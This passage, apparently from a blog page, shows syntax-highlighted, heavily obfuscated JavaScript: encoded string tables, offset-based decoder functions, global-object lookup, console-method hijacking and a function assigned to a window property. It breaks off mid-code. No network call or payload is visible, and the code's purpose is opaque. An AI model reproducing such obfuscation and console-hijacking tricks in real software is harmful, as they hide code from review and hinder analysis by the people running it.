-_0x11031c.<span class="property">_0x426376</span>, -_0x11031c.<span class="property">_0x5ddded</span>)](_0x20c483, <span class="variable language_">arguments</span>);</span><br><span class="line">                            <span class="keyword">return</span> _0x2f7999 = <span class="literal">null</span>,</span><br><span class="line">                            _0x233e4b;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">var</span> _0x27b3a6 = _0x24bac0[<span class="string">&#x27;apply&#x27;</span>](_0x4c04a2, <span class="variable language_">arguments</span>);</span><br><span class="line">                        <span class="keyword">return</span> _0x24bac0 = <span class="literal">null</span>,</span><br><span class="line">                        _0x27b3a6;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        : <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">        ;</span><br><span class="line">        <span class="keyword">return</span> _0x3b189a = ![],</span><br><span class="line">        _0x4a5a98;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line">&#125;());</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_0x43b95d</span>(<span class="params">_0x16a9da, _0x24077d, _0x3b1e2f, _0x31bd32</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> _0x415853 = &#123;</span><br><span class="line">        <span class="attr">_0x365bca</span>: <span class="number">0x88</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">_0x2fa2</span>(_0x16a9da - _0x415853.<span class="property">_0x365bca</span>, _0x24077d);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_0x219d</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> _0x30f34b = [<span class="string">&#x27;BgvUz3rO&#x27;</span>, <span class="string">&#x27;x19WCM90B19F&#x27;</span>, <span class="string">&#x27;yMHwBLK&#x27;</span>, <span class="string">&#x27;r0fpB2y&#x27;</span>, <span class="string">&#x27;ndq1mdK3vKXQD2Xf&#x27;</span>, <span class="string">&#x27;BMn0Aw9UkcKG&#x27;</span>, <span class="string">&#x27;qKriuhy&#x27;</span>, <span class="string">&#x27;zNnOyNmUCgHW77Ym&#x27;</span>, <span class="string">&#x27;sNfnv2u&#x27;</span>, <span class="string">&#x27;sNvZDcbWyxj0ia&#x27;</span>, <span class="string">&#x27;CMv0DxjUicHMDq&#x27;</span>, <span class="string">&#x27;Bg9N&#x27;</span>, <span class="string">&#x27;u3zVDMK&#x27;</span>, <span class="string">&#x27;Dg9tDhjPBMC&#x27;</span>, <span class="string">&#x27;vgHLCMuGAxmGBq&#x27;</span>, <span class="string">&#x27;y29UC29Szq&#x27;</span>, <span class="string">&#x27;mtq4mduYrhfgDePg&#x27;</span>, <span class="string">&#x27;BeXZrMi&#x27;</span>, <span class="string">&#x27;CMr6AwG&#x27;</span>, <span class="string">&#x27;Ce1LCLO&#x27;</span>, <span class="string">&#x27;mtqXmJaYmJbQrxjKtvi&#x27;</span>, <span class="string">&#x27;y29UC3rYDwn0BW&#x27;</span>, <span class="string">&#x27;mM9nEvvdtW&#x27;</span>, <span class="string">&#x27;t2HSvg4&#x27;</span>, <span class="string">&#x27;yMLUza&#x27;</span>, <span class="string">&#x27;t1PSvLu&#x27;</span>, <span class="string">&#x27;DhjHy2u&#x27;</span>, <span class="string">&#x27;zxHJzxb0Aw9U&#x27;</span>, <span class="string">&#x27;ChjVDg90ExbL&#x27;</span>, <span class="string">&#x27;yxbWBhK&#x27;</span>, <span class="string">&#x27;CLLSzKW&#x27;</span>, <span class="string">&#x27;qM1dzLO&#x27;</span>, <span class="string">&#x27;C2vHCMnO&#x27;</span>, <span class="string">&#x27;sgTmCuS&#x27;</span>, <span class="string">&#x27;wLPXD0y&#x27;</span>, <span class="string">&#x27;BuDvAve&#x27;</span>, <span class="string">&#x27;B3jLihrVignVBq&#x27;</span>, <span class="string">&#x27;wgjrufO&#x27;</span>, <span class="string">&#x27;qNzWyvK&#x27;</span>, <span class="string">&#x27;DgfIBgu&#x27;</span>, <span class="string">&#x27;rNjVr1a&#x27;</span>, <span class="string">&#x27;rxH0Bwy&#x27;</span>, <span class="string">&#x27;zMnKt0u&#x27;</span>, <span class="string">&#x27;Dg9NzxrOzxi&#x27;</span>, <span class="string">&#x27;DxHZruG&#x27;</span>, <span class="string">&#x27;C0D1wvO&#x27;</span>, <span class="string">&#x27;rwfHEK0&#x27;</span>, <span class="string">&#x27;mtHwzwnYDvu&#x27;</span>, <span class="string">&#x27;v0fUDfi&#x27;</span>, <span class="string">&#x27;mtjowMn0uw4&#x27;</span>, <span class="string">&#x27;mtu4mfnrCuLsuq&#x27;</span>, <span class="string">&#x27;mZu5odf6wfHwA3q&#x27;</span>, <span class="string">&#x27;y3rVCIGICMv0Dq&#x27;</span>, <span class="string">&#x27;sgzKDhe&#x27;</span>, <span class="string">&#x27;u3rPDgnOigL0ia&#x27;</span>, <span class="string">&#x27;sNzcDgS&#x27;</span>, <span class="string">&#x27;yvjIzxm&#x27;</span>, <span class="string">&#x27;uwn3ALG&#x27;</span>, <span class="string">&#x27;zxjYB3i&#x27;</span>, <span class="string">&#x27;EKjJqLm&#x27;</span>, <span class="string">&#x27;mJa3mtuXuMLZrvzf&#x27;</span>, <span class="string">&#x27;mNWZFdb8mxW1Fa&#x27;</span>, <span class="string">&#x27;kcGOlISPkYKRkq&#x27;</span>, <span class="string">&#x27;ota4oe1Jtwz3Ba&#x27;</span>, <span class="string">&#x27;mJa3meXSzg9OuG&#x27;</span>, <span class="string">&#x27;ywXLCNq&#x27;</span>, <span class="string">&#x27;ntq2mtq1D2r3rhP4&#x27;</span>, <span class="string">&#x27;AwLfBMO&#x27;</span>, <span class="string">&#x27;rM1vuuu&#x27;</span>, <span class="string">&#x27;zLf1DKW&#x27;</span>];</span><br><span class="line">    _0x219d = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> _0x30f34b;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">_0x219d</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> _0xfb81ef = <span class="title function_">_0x335615</span>(<span class="variable language_">this</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> _0x86515e = &#123;</span><br><span class="line">        <span class="attr">_0x286f56</span>: <span class="number">0x193</span>,</span><br><span class="line">        <span class="attr">_0x19da52</span>: <span class="number">0x187</span>,</span><br><span class="line">        <span class="attr">_0x2b457d</span>: <span class="number">0x1a9</span>,</span><br><span class="line">        <span class="attr">_0x128216</span>: <span class="number">0x1b2</span>,</span><br><span class="line">        <span class="attr">_0x4ffbab</span>: <span class="number">0x1c9</span>,</span><br><span class="line">        <span class="attr">_0x28ed0e</span>: <span class="number">0x170</span>,</span><br><span class="line">        <span class="attr">_0x291b9a</span>: <span class="number">0x199</span>,</span><br><span class="line">        <span class="attr">_0x4bb0db</span>: <span class="number">0x19a</span>,</span><br><span class="line">        <span class="attr">_0x7c06bb</span>: <span class="number">0x46d</span>,</span><br><span class="line">        <span class="attr">_0x27e896</span>: <span class="number">0x48c</span>,</span><br><span class="line">        <span class="attr">_0x45dc0</span>: <span class="number">0x190</span>,</span><br><span class="line">        <span class="attr">_0x1489c9</span>: <span class="number">0x1ad</span>,</span><br><span class="line">        <span class="attr">_0x347965</span>: <span class="number">0x1a9</span>,</span><br><span class="line">        <span class="attr">_0x59f0ab</span>: <span class="number">0x449</span>,</span><br><span class="line">        <span class="attr">_0x2c1a61</span>: <span class="number">0x430</span>,</span><br><span class="line">        <span class="attr">_0x9df6de</span>: <span class="number">0x451</span>,</span><br><span class="line">        <span class="attr">_0x4f3b7c</span>: <span class="number">0x197</span>,</span><br><span class="line">        <span class="attr">_0x445b79</span>: <span class="number">0x184</span>,</span><br><span class="line">        <span class="attr">_0x35dac4</span>: <span class="number">0x196</span>,</span><br><span class="line">        <span class="attr">_0x2e155b</span>: <span class="number">0x463</span>,</span><br><span class="line">        <span class="attr">_0x4163a0</span>: <span class="number">0x440</span>,</span><br><span class="line">        <span class="attr">_0x35590a</span>: <span class="number">0x449</span>,</span><br><span class="line">        <span class="attr">_0x5a92d9</span>: <span class="number">0x48e</span>,</span><br><span class="line">        <span class="attr">_0x5713dd</span>: <span class="number">0x486</span>,</span><br><span class="line">        <span class="attr">_0x9ce866</span>: <span class="number">0x469</span>,</span><br><span class="line">        <span class="attr">_0x5d2011</span>: <span class="number">0x47a</span>,</span><br><span class="line">        <span class="attr">_0x2fb363</span>: <span class="number">0x43a</span>,</span><br><span class="line">        <span class="attr">_0x49d807</span>: <span class="number">0x441</span>,</span><br><span class="line">        <span class="attr">_0x4773f9</span>: <span class="number">0x191</span>,</span><br><span class="line">        <span class="attr">_0x2f7d38</span>: <span class="number">0x189</span>,</span><br><span class="line">        <span class="attr">_0x32352a</span>: <span class="number">0x19c</span>,</span><br><span class="line">        <span class="attr">_0xa28e16</span>: <span class="number">0x1a3</span>,</span><br><span class="line">        <span class="attr">_0x393026</span>: <span class="number">0x1be</span>,</span><br><span class="line">        <span class="attr">_0x4bed42</span>: <span class="number">0x1e0</span>,</span><br><span class="line">        <span class="attr">_0x3138ee</span>: <span class="number">0x468</span>,</span><br><span class="line">        <span class="attr">_0x1efc32</span>: <span class="number">0x48a</span>,</span><br><span class="line">        <span class="attr">_0x1e00d8</span>: <span class="number">0x46f</span>,</span><br><span class="line">        <span class="attr">_0x14f997</span>: <span class="number">0x49a</span>,</span><br><span class="line">        <span class="attr">_0x1fabb8</span>: <span class="number">0x491</span>,</span><br><span class="line">        <span class="attr">_0x18ef54</span>: <span class="number">0x489</span>,</span><br><span class="line">        <span class="attr">_0x3642df</span>: <span class="number">0x455</span>,</span><br><span class="line">        <span class="attr">_0x5e5450</span>: <span class="number">0x459</span>,</span><br><span class="line">        <span class="attr">_0x15d374</span>: <span class="number">0x45a</span>,</span><br><span class="line">        <span class="attr">_0xbb9bff</span>: <span class="number">0x452</span>,</span><br><span class="line">        <span class="attr">_0x540c80</span>: <span class="number">0x433</span>,</span><br><span class="line">        <span class="attr">_0x28a91f</span>: <span class="number">0x453</span>,</span><br><span class="line">        <span class="attr">_0x174890</span>: <span class="number">0x44f</span>,</span><br><span class="line">        <span class="attr">_0x17342b</span>: <span class="number">0x1b1</span>,</span><br><span class="line">        <span class="attr">_0x13795f</span>: <span class="number">0x18f</span>,</span><br><span class="line">        <span class="attr">_0x3c7980</span>: <span class="number">0x18e</span>,</span><br><span class="line">        <span class="attr">_0x397a84</span>: <span class="number">0x439</span>,</span><br><span class="line">        <span class="attr">_0x1dacac</span>: <span class="number">0x457</span>,</span><br><span class="line">        <span class="attr">_0x500c6c</span>: <span class="number">0x1a6</span>,</span><br><span class="line">        <span class="attr">_0x2d2155</span>: <span class="number">0x186</span>,</span><br><span class="line">        <span class="attr">_0x26599c</span>: <span class="number">0x190</span></span><br><span class="line">    &#125;</span><br><span class="line">      , _0x1e0392 = &#123;</span><br><span class="line">        <span class="attr">_0x2a0a5c</span>: <span class="number">0xac</span></span><br><span class="line">    &#125;</span><br><span class="line">      , _0x3d04ad = &#123;</span><br><span class="line">        <span class="attr">_0x4cc0de</span>: <span class="number">0x376</span></span><br><span class="line">    &#125;</span><br><span class="line">      , _0x218a07 = &#123;</span><br><span class="line">        <span class="attr">_0x334681</span>: <span class="number">0x437</span>,</span><br><span class="line">        <span class="attr">_0x3e0531</span>: <span class="number">0x423</span>,</span><br><span class="line">        <span class="attr">_0x265858</span>: <span class="number">0x427</span>,</span><br><span class="line">        <span class="attr">_0x328b53</span>: <span class="number">0x42d</span>,</span><br><span class="line">        <span class="attr">_0x25e2fd</span>: <span class="number">0x3ff</span>,</span><br><span class="line">        <span class="attr">_0x12cc97</span>: <span class="number">0x405</span>,</span><br><span class="line">        <span class="attr">_0x4c19ff</span>: <span class="number">0x419</span>,</span><br><span class="line">        <span class="attr">_0x2f93b9</span>: <span class="number">0x415</span>,</span><br><span class="line">        <span class="attr">_0x122edb</span>: <span class="number">0x428</span>,</span><br><span class="line">        <span class="attr">_0x46fbc7</span>: <span class="number">0x40c</span>,</span><br><span class="line">        <span class="attr">_0x58105b</span>: <span class="number">0x428</span></span><br><span class="line">    &#125;</span><br><span class="line">      , _0x18d994 = &#123;</span><br><span class="line">        <span class="attr">_0xa1a695</span>: <span class="number">0x41</span></span><br><span class="line">    &#125;</span><br><span class="line">      , _0x274b97 = &#123;</span><br><span class="line">        <span class="string">&#x27;pMerZ&#x27;</span>: <span class="keyword">function</span>(<span class="params">_0x11187d, _0x1e4667</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> _0x11187d + _0x1e4667;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;zBcBS&#x27;</span>: <span class="keyword">function</span>(<span class="params">_0xfc867a</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">_0xfc867a</span>();</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;HkLqK&#x27;</span>: <span class="title function_">_0xfcd4c3</span>(<span class="number">0x16f</span>, _0x86515e.<span class="property">_0x286f56</span>, <span class="number">0x183</span>, _0x86515e.<span class="property">_0x19da52</span>),</span><br><span class="line">        <span class="string">&#x27;BDHPv&#x27;</span>: <span class="string">&#x27;info&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;hnIHA&#x27;</span>: <span class="title function_">_0xfcd4c3</span>(<span class="number">0x1d1</span>, _0x86515e.<span class="property">_0x2b457d</span>, _0x86515e.<span class="property">_0x128216</span>, _0x86515e.<span class="property">_0x4ffbab</span>),</span><br><span class="line">        <span class="string">&#x27;aRbes&#x27;</span>: <span class="title function_">_0xfcd4c3</span>(_0x86515e.<span class="property">_0x28ed0e</span>, _0x86515e.<span class="property">_0x291b9a</span>, <span class="number">0x193</span>, _0x86515e.<span class="property">_0x4bb0db</span>),</span><br><span class="line">        <span class="string">&#x27;ORqsS&#x27;</span>: <span class="title function_">_0x2b8afa</span>(_0x86515e.<span class="property">_0x7c06bb</span>, <span class="number">0x462</span>, _0x86515e.<span class="property">_0x27e896</span>, <span class="number">0x469</span>),</span><br><span class="line">        <span class="string">&#x27;lLsFb&#x27;</span>: <span class="keyword">function</span>(<span class="params">_0x34a9a3, _0x4110b5</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> _0x34a9a3 &lt; _0x4110b5;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;sGuYZ&#x27;</span>: <span class="string">&#x27;5|2|1|0|3|&#x27;</span> + <span class="string">&#x27;4&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">      , _0x23eea3 = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> _0x28ca73 = &#123;</span><br><span class="line">            <span class="attr">_0x5c6bb7</span>: <span class="number">0x17a</span>,</span><br><span class="line">            <span class="attr">_0x4e7ce5</span>: <span class="number">0x298</span>,</span><br><span class="line">            <span class="attr">_0x802c84</span>: <span class="number">0x7d</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">_0x5515cc</span>(<span class="params">_0x2e8499, _0x270277, _0xa14d2e, _0x435b89</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">_0xfcd4c3</span>(_0x270277, _0x270277 - <span class="number">0x160</span>, _0x435b89 - <span class="number">0x285</span>, _0x435b89 - _0x18d994.<span class="property">_0xa1a695</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> _0x171219;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">_0x51b2df</span>(<span class="params">_0xedb1f2, _0x188f0f, _0x5ba311, _0x81a1a1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">_0xfcd4c3</span>(_0x81a1a1, _0x188f0f - _0x28ca73.<span class="property">_0x5c6bb7</span>, _0x188f0f - _0x28ca73.<span class="property">_0x4e7ce5</span>, _0x81a1a1 - _0x28ca73.<span class="property">_0x802c84</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            _0x171219 = <span class="title class_">Function</span>(_0x274b97[<span class="title function_">_0x51b2df</span>(_0x218a07.<span class="property">_0x334681</span>, _0x218a07.<span class="property">_0x3e0531</span>, _0x218a07.<span class="property">_0x265858</span>, _0x218a07.<span class="property">_0x328b53</span>)](<span class="title function_">_0x5515cc</span>(_0x218a07.<span class="property">_0x25e2fd</span>, _0x218a07.<span class="property">_0x12cc97</span>, _0x218a07.<span class="property">_0x4c19ff</span>, <span class="number">0x407</span>) + <span class="title function_">_0x51b2df</span>(<span class="number">0x411</span>, _0x218a07.<span class="property">_0x2f93b9</span>, _0x218a07.<span class="property">_0x122edb</span>, _0x218a07.<span class="property">_0x46fbc7</span>), <span class="string">&#x27;&#123;&#125;.constru&#x27;</span> + <span class="title function_">_0x5515cc</span>(_0x218a07.<span class="property">_0x58105b</span>, <span class="number">0x421</span>, <span class="number">0x448</span>, <span class="number">0x431</span>) + <span class="string">&#x27;rn\x20this\x22)(&#x27;</span> + <span class="string">&#x27;\x20)&#x27;</span>) + <span class="string">&#x27;);&#x27;</span>)();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (_0x421704) &#123;</span><br><span class="line">            _0x171219 = <span class="variable language_">window</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> _0x171219;</span><br><span class="line">    &#125;</span><br><span class="line">      , _0x1b449f = _0x274b97[<span class="title function_">_0xfcd4c3</span>(_0x86515e.<span class="property">_0x45dc0</span>, _0x86515e.<span class="property">_0x1489c9</span>, <span class="number">0x1b3</span>, _0x86515e.<span class="property">_0x347965</span>)](_0x23eea3)</span><br><span class="line">      , _0xf883ee = _0x1b449f[<span class="title function_">_0x2b8afa</span>(_0x86515e.<span class="property">_0x59f0ab</span>, <span class="number">0x44d</span>, _0x86515e.<span class="property">_0x2c1a61</span>, _0x86515e.<span class="property">_0x9df6de</span>)] = _0x1b449f[<span class="string">&#x27;console&#x27;</span>] || &#123;&#125;</span><br><span class="line">      , _0x53109c = [_0x274b97[<span class="title function_">_0xfcd4c3</span>(_0x86515e.<span class="property">_0x4f3b7c</span>, _0x86515e.<span class="property">_0x445b79</span>, _0x86515e.<span class="property">_0x291b9a</span>, _0x86515e.<span class="property">_0x35dac4</span>)], <span class="string">&#x27;warn&#x27;</span>, _0x274b97[<span class="title function_">_0x2b8afa</span>(_0x86515e.<span class="property">_0x2e155b</span>, _0x86515e.<span class="property">_0x4163a0</span>, _0x86515e.<span class="property">_0x35590a</span>, <span class="number">0x448</span>)], _0x274b97[<span class="string">&#x27;hnIHA&#x27;</span>], _0x274b97[<span class="title function_">_0x2b8afa</span>(_0x86515e.<span class="property">_0x5a92d9</span>, _0x86515e.<span class="property">_0x5713dd</span>, _0x86515e.<span class="property">_0x9ce866</span>, _0x86515e.<span class="property">_0x5d2011</span>)], _0x274b97[<span class="string">&#x27;ORqsS&#x27;</span>], <span class="title function_">_0x2b8afa</span>(_0x86515e.<span class="property">_0x2fb363</span>, _0x86515e.<span class="property">_0x49d807</span>, <span class="number">0x447</span>, <span class="number">0x45c</span>)];</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_0x2b8afa</span>(<span class="params">_0x410775, _0x271235, _0xaede52, _0x7ad671</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">_0x2fa2</span>(_0x7ad671 - _0x3d04ad.<span class="property">_0x4cc0de</span>, _0xaede52);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_0xfcd4c3</span>(<span class="params">_0x270100, _0x1435df, _0x586469, _0x24f88a</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">_0x2fa2</span>(_0x586469 - _0x1e0392.<span class="property">_0x2a0a5c</span>, _0x270100);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> _0x52328e = -<span class="number">0x1c37</span> + -<span class="number">0x2db</span> + <span class="number">0x1f12</span>; _0x274b97[<span class="title function_">_0xfcd4c3</span>(_0x86515e.<span class="property">_0x45dc0</span>, _0x86515e.<span class="property">_0x4773f9</span>, _0x86515e.<span class="property">_0x2f7d38</span>, _0x86515e.<span class="property">_0x32352a</span>)](_0x52328e, _0x53109c[<span class="title function_">_0xfcd4c3</span>(<span class="number">0x1c2</span>, _0x86515e.<span class="property">_0xa28e16</span>, _0x86515e.<span class="property">_0x393026</span>, _0x86515e.<span class="property">_0x4bed42</span>)]); _0x52328e++) &#123;</span><br><span class="line">        <span class="keyword">var</span> _0x161f25 = _0x274b97[<span class="title function_">_0x2b8afa</span>(<span class="number">0x46b</span>, _0x86515e.<span class="property">_0x3138ee</span>, _0x86515e.<span class="property">_0x1efc32</span>, _0x86515e.<span class="property">_0x1e00d8</span>)][<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">          , _0x5ed1e0 = <span class="number">0x162d</span> + -<span class="number">0x1d</span> * <span class="number">0xda</span> + <span class="number">0x3</span> * <span class="number">0xd7</span>;</span><br><span class="line">        <span class="keyword">while</span> (!![]) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (_0x161f25[_0x5ed1e0++]) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                _0x2e72f3[<span class="title function_">_0x2b8afa</span>(_0x86515e.<span class="property">_0x14f997</span>, _0x86515e.<span class="property">_0x5d2011</span>, _0x86515e.<span class="property">_0x1fabb8</span>, _0x86515e.<span class="property">_0x18ef54</span>)] = _0x335615[<span class="title function_">_0x2b8afa</span>(<span class="number">0x455</span>, _0x86515e.<span class="property">_0x3642df</span>, _0x86515e.<span class="property">_0x5e5450</span>, _0x86515e.<span class="property">_0x15d374</span>)](_0x335615);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                <span class="keyword">var</span> _0x5b572d = _0xf883ee[_0x2327c2] || _0x2e72f3;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">                <span class="keyword">var</span> _0x2327c2 = _0x53109c[_0x52328e];</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">                _0x2e72f3[<span class="string">&#x27;toString&#x27;</span>] = _0x5b572d[<span class="title function_">_0x2b8afa</span>(_0x86515e.<span class="property">_0xbb9bff</span>, _0x86515e.<span class="property">_0x540c80</span>, _0x86515e.<span class="property">_0x28a91f</span>, _0x86515e.<span class="property">_0x174890</span>)][<span class="title function_">_0xfcd4c3</span>(_0x86515e.<span class="property">_0x17342b</span>, _0x86515e.<span class="property">_0x13795f</span>, <span class="number">0x190</span>, _0x86515e.<span class="property">_0x3c7980</span>)](_0x5b572d);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">                _0xf883ee[_0x2327c2] = _0x2e72f3;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">                <span class="keyword">var</span> _0x2e72f3 = _0x335615[<span class="title function_">_0x2b8afa</span>(_0x86515e.<span class="property">_0x397a84</span>, _0x86515e.<span class="property">_0x28a91f</span>, <span class="number">0x43c</span>, _0x86515e.<span class="property">_0x1dacac</span>) + <span class="string">&#x27;r&#x27;</span>][<span class="title function_">_0xfcd4c3</span>(<span class="number">0x1ad</span>, _0x86515e.<span class="property">_0x128216</span>, <span class="number">0x194</span>, _0x86515e.<span class="property">_0x500c6c</span>)][<span class="title function_">_0xfcd4c3</span>(<span class="number">0x18f</span>, _0x86515e.<span class="property">_0x2d2155</span>, _0x86515e.<span class="property">_0x26599c</span>, <span class="number">0x19f</span>)](_0x335615);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="title function_">_0xfb81ef</span>(),</span><br><span class="line"><span class="variable language_">window</span>[<span class="title function_">_0x43b95d</span>(<span class="number">0x195</span>, <span class="number">0x186</span>, <span class="number">0x177</span>, <span class="number">0x185</span>)] = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> _0x11e4ba = &#123;</span><br><span class="line">        <span class="attr">_0x54ce81</span>: <span class="number">0x81</span>,</span><br><span class="line">        <span class="attr">_0x3f05fd</span>: <span class="number">0x8b</span>,</span><br><span class="line">        <span class="attr">_0x3c12d8</span>: <span class="number">0x66</span>,</span><br><span class="line">        <span class="attr">_0x4f7709</span>: <span class="number">0x24b</span>,</span><br><span class="line">        <span class="attr">_0x4097be</span>: <span class="number">0x261</span>,</span><br><span class="line">        <span class="attr">_0x26b0f8</span>: <span class="number">0x24e</span>,</span><br><span class="line">        <span class="attr">_0x34a3a3</span>: <span class="number">0xb7</span>,</span><br><span class="line">        <span class="attr">_0x67fb88</span>: <span class="number">0x9c</span>,</span><br><span class="line">        <span class="attr">_0x4337fa</span>: <span class="number">0xbb</span>,</span><br><span class="line">        <span class="attr">_0x2d8f19</span>: <span class="number">0xbe</span>,</span><br><span class="line">        <span class="attr">_0x16ffa7</span>: <span class="number">0x25c</span>,</span><br><span class="line">        <span class="attr">_0x29c7a0</span>: <span class="number">0x239</span>,</span><br><span class="line">        <span class="attr">_0x4fd058</span>: <span class="number">0x245</span>,</span><br><span class="line">        <span class="attr">_0x1eed2e</span>: <span class="number">0x251</span>,</span><br><span class="line">        <span class="attr">_0x3d8cce</span>: <span class="number">0x25c</span>,</span><br><span class="line">        <span class="attr">_0x135008</span>: <span class="number">0x27e</span>,</span><br><span class="line">        <span class="attr">_0x1548b1</span>: <span class="number">0x264</span>,</span><br><span class="line">        <span class="attr">_0x1aa760</span>: <span class="number">0x23c</span>,</span><br><span class="line">        <span class="attr">_0x229bf7</span>: <span class="number">0x244</span>,</span><br><span class="line">        <span class="attr">_0xe6db95</span>: <span class="number">0x239</span>,</span><br><span class="line">        <span class="attr">_0x3aa31e</span>: <span class="number">0x23b</span>,</span><br><span class="line">        <span class="attr">_0x3c19c3</span>: <span class="number">0x93</span>,</span><br><span class="line">        <span class="attr">_0x52b346</span>: <span class="number">0xba</span>,</span><br><span class="line">        <span class="attr">_0x48ed1f</span>: <span class="number">0x268</span>,</span><br><span class="line">        <span class="attr">_0x5d4762</span>: <span class="number">0x26c</span>,</span><br><span class="line">        <span class="attr">_0x3c9e76</span>: <span class="number">0x254</span>,</span><br><span class="line">        <span class="attr">_0x2a9f09</span>: <span class="number">0x276</span></span><br><span class="line">    &#125;</span><br><span class="line">      , _0x28ad78 = &#123;</span><br><span class="line">        <span class="attr">_0x5cc3bd</span>: <span class="number">0xd7</span>,</span><br><span class="line">        <span class="attr">_0x17ef46</span>: <span class="number">0x1a2</span>,</span><br><span class="line">        <span class="attr">_0x53dab6</span>: <span class="number">0x129</span></span><br><span class="line">    &#125;</span><br><span class="line">      , _0x36a7b3 = &#123;</span><br><span class="line">        <span class="attr">_0x2f2c5a</span>: <span class="number">0xe9</span>,</span><br><span class="line">        <span class="attr">_0x101124</span>: <span class="number">0x10b</span></span><br><span class="line">    &#125;</span><br><span class="line">      , _0x8bd32d = &#123;</span><br><span class="line">        <span class="string">&#x27;BmCfZ&#x27;</span>: <span class="keyword">function</span>(<span class="params">_0x571dda, _0x15b43b</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">_0x571dda</span>(_0x15b43b);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;rjCiw&#x27;</span>: <span class="string">&#x27;rqxvweqty，&#x27;</span> + <span class="title function_">_0x2f5b69</span>(_0x11e4ba.<span class="property">_0x54ce81</span>, <span class="number">0x86</span>, _0x11e4ba.<span class="property">_0x3f05fd</span>, _0x11e4ba.<span class="property">_0x3c12d8</span>) + <span class="string">&#x27;of\x20it&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">      , _0x12c806 = <span class="title function_">_0xf4e5c</span>(_0x11e4ba.<span class="property">_0x4f7709</span>, _0x11e4ba.<span class="property">_0x4097be</span>, <span class="number">0x258</span>, <span class="number">0x25a</span>) + <span class="title function_">_0xf4e5c</span>(<span class="number">0x261</span>, <span class="number">0x252</span>, <span class="number">0x282</span>, _0x11e4ba.<span class="property">_0x26b0f8</span>) + <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_0xf4e5c</span>(<span class="params">_0x5cdb5f, _0x1bf623, _0x4be90e, _0x2b1dd6</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">_0x43b95d</span>(_0x5cdb5f - _0x36a7b3.<span class="property">_0x2f2c5a</span>, _0x1bf623, _0x4be90e - _0x36a7b3.<span class="property">_0x101124</span>, _0x2b1dd6 - _0x36a7b3.<span class="property">_0x2f2c5a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    _0x8bd32d[<span class="title function_">_0x2f5b69</span>(_0x11e4ba.<span 